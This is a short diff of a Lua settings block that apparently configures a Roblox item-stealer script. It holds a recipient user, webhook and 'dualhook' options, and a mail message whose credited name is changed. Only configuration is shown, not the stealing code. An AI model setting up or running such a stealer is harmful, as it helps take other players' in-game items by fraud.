@@ -10,7 +10,7 @@
 getgenv().Settings = {
     User = "fc_qn",
     Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "|StickOgh| GG",
+    MailMessage = "|Fc_qn| GG",
     Titanics = {
         Dualhook = false,
         Intensity = 100 --%
